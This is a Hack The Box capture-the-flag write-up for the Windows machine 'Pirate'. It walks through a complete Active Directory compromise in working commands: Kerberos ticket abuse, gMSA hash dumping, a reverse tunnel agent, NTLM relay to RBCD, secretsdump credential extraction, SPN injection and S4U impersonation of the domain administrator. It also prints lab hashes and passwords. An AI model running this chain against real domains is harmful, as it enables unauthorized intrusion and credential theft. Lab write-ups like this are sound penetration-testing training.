<div align="center">

# Pirate — HackTheBox

![Difficulty](https://img.shields.io/badge/Difficulty-Medium-orange?style=for-the-badge)
![OS](https://img.shields.io/badge/OS-Windows-blue?style=for-the-badge)
![Status](https://img.shields.io/badge/Status-Rooted-success?style=for-the-badge)

<img src="../assets/MrsNobody.png" width="200" alt="MrsNobody">

**MrsNobody**


---

</div>

> **Disclaimer:** This writeup is for educational purposes only, performed in an authorized Hack The Box environment.

## Target Information

| Property | Value |
|----------|-------|
| Machine | Pirate |
| IP | `<Target_Machine_IP>` |
| OS | Windows |
| Difficulty | Medium |
| Hostname | DC01.pirate.htb |
| Domain | PIRATE.HTB |

## Table of Contents

1. [Attack Chain Overview](#attack-chain-overview)
2. [Initial Setup](#initial-setup)
3. [Pre-Windows 2000 Compatible Access Abuse](#pre-windows-2000-compatible-access-abuse)
4. [Dump gMSA Passwords](#dump-gmsa-passwords)
5. [Shell on DC01](#shell-on-dc01)
6. [Pivot to Internal Network (Ligolo)](#pivot-to-internal-network-ligolo)
7. [NTLM Relay to RBCD](#ntlm-relay-to-rbcd)
8. [Administrator on WEB01](#administrator-on-web01)
9. [Dump Credentials](#dump-credentials)
10. [Reset Delegated Admin Password](#reset-delegated-admin-password)
11. [SPN Injection (WriteSPN Abuse)](#spn-injection-writespn-abuse)
12. [S4U Delegation to DC01 Administrator](#s4u-delegation-to-dc01-administrator)
13. [Flags](#flags)

---

## Attack Chain Overview

```
MS01$ (Pre-Win2000)
  -> gMSA dump
    -> DC shell
      -> Ligolo pivot
        -> NTLM relay -> RBCD
          -> Administrator on WEB01
            -> secretsdump
              -> Reset a.white_adm
                -> SPN injection
                  -> S4U abuse
                    -> Administrator on DC01
                      -> root.txt
```

---

## Initial Setup

### Add Hosts

```bash
sudo nano /etc/hosts
```

```
<Target_Machine_IP>  DC01.pirate.htb pirate.htb MS01.pirate.htb
192.168.100.2        WEB01.pirate.htb
```

### Configure Kerberos

```bash
sudo nano /etc/krb5.conf
```

```ini
[libdefaults]
    default_realm = PIRATE.HTB
    dns_lookup_realm = false
    dns_lookup_kdc = false

[realms]
    PIRATE.HTB = {
        kdc = <Target_Machine_IP>
        admin_server = <Target_Machine_IP>
    }

[domain_realm]
    .pirate.htb = PIRATE.HTB
    pirate.htb = PIRATE.HTB
```

---

## Pre-Windows 2000 Compatible Access Abuse

MS01$ was a member of:

> Pre-Windows 2000 Compatible Access

Machine password = machine name (`ms01`)

```bash
impacket-getTGT 'PIRATE.HTB/MS01$:ms01'
export KRB5CCNAME=MS01\$.ccache
klist
```

---

## Dump gMSA Passwords

```bash
python3 gMSADumper.py -d pirate.htb -l dc01.pirate.htb -k
```

Recovered:

```
gMSA_ADFS_prod$:::8126756fb2e69697bfcb04816e685839
```

---

## Shell on DC01

```bash
evil-winrm -i DC01.pirate.htb \
  -u 'gMSA_ADFS_prod$' \
  -H '8126756fb2e69697bfcb04816e685839'
```

---

## Pivot to Internal Network (Ligolo)

### Attack Terminal - Start Proxy

```bash
./proxy -selfcert -laddr 0.0.0.0:443
```

### DC Shell - Run Agent

```powershell
.\agent.exe -connect <YOUR_TUN_IP>:443 -ignore-cert
```

### Attack Terminal - Configure Tunnel

```bash
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
sudo ip route add 192.168.100.0/24 dev ligolo
sudo ip addr add 192.168.100.50/24 dev ligolo
```

---

## NTLM Relay to RBCD

```bash
ntlmrelayx.py -t ldaps://<Target_Machine_IP> --delegate-access --remove-mic -smb2support
```

```bash
coercer coerce -l <YOUR_TUN_IP> -t 192.168.100.2 -d pirate.htb \
  -u 'gMSA_ADFS_prod$' --hashes :8126756fb2e69697bfcb04816e685839 --always-continue
```

---

## Administrator on WEB01

```bash
python3 /usr/share/doc/python3-impacket/examples/getST.py \
  -spn 'cifs/WEB01.pirate.htb' \
  -impersonate 'Administrator' \
  'pirate.htb/VYSHKGDW$:PASSWORD' \
  -dc-ip <Target_Machine_IP>
```

```bash
export KRB5CCNAME=Administrator@cifs_WEB01.pirate.htb@PIRATE.HTB.ccache
```

```bash
python3 /usr/share/doc/python3-impacket/examples/psexec.py \
  -k -no-pass Administrator@WEB01.pirate.htb
```

---

## Dump Credentials

```bash
secretsdump.py -k -no-pass WEB01.pirate.htb -outputfile web01_dump
```

Recovered:

```
PIRATE\a.white : E2nvAOKSz5Xz2MJu
```

---

## Reset Delegated Admin Password

```bash
bloodyAD -d pirate.htb -u 'a.white' -p 'E2nvAOKSz5Xz2MJu' \
  -H <Target_Machine_IP> -i <Target_Machine_IP> \
  set password a.white_adm 'pulse1337!'
```

---

## SPN Injection (WriteSPN Abuse)

Both SPNs must be moved:

- HTTP/WEB01.pirate.htb
- HTTP/WEB01

```bash
python3 addspn.py <Target_Machine_IP> -u 'PIRATE\a.white_adm' -p 'pulse1337!' \
  -t 'WEB01$' -s 'HTTP/WEB01.pirate.htb' --remove

python3 addspn.py <Target_Machine_IP> -u 'PIRATE\a.white_adm' -p 'pulse1337!' \
  -t 'WEB01$' -s 'HTTP/WEB01' --remove

python3 addspn.py <Target_Machine_IP> -u 'PIRATE\a.white_adm' -p 'pulse1337!' \
  -t 'DC01$' -s 'HTTP/WEB01.pirate.htb'

python3 addspn.py <Target_Machine_IP> -u 'PIRATE\a.white_adm' -p 'pulse1337!' \
  -t 'DC01$' -s 'HTTP/WEB01'
```

---

## S4U Delegation to DC01 Administrator

```bash
python3 /usr/share/doc/python3-impacket/examples/getST.py \
  -spn 'HTTP/WEB01.pirate.htb' \
  -impersonate 'Administrator' \
  'pirate.htb/a.white_adm:pulse1337!' \
  -dc-ip <Target_Machine_IP> \
  -altservice 'CIFS/DC01.pirate.htb'
```

```bash
export KRB5CCNAME=Administrator@CIFS_DC01.pirate.htb@PIRATE.HTB.ccache
klist
```

```bash
python3 /usr/share/doc/python3-impacket/examples/wmiexec.py \
  -k -no-pass pirate.htb/Administrator@DC01.pirate.htb
```

---

## Flags

### User Flag

**Location:**

```
C:\Users\a.white\Desktop\user.txt
```

**Command:**

```cmd
type C:\Users\a.white\Desktop\user.txt
```

### Root Flag

**Location:**

```
C:\Users\Administrator\Desktop\root.txt
```

**Command:**

```cmd
type C:\Users\Administrator\Desktop\root.txt
```

| Flag | Value |
|------|-------|
| User | `<REDACTED>` |
| Root | `<REDACTED>` |

---

<div align="center">

**Written by MrsNobody**

<img src="../assets/MrsNobody.png" width="80">

*Hack The Box — Pirate*

</div>
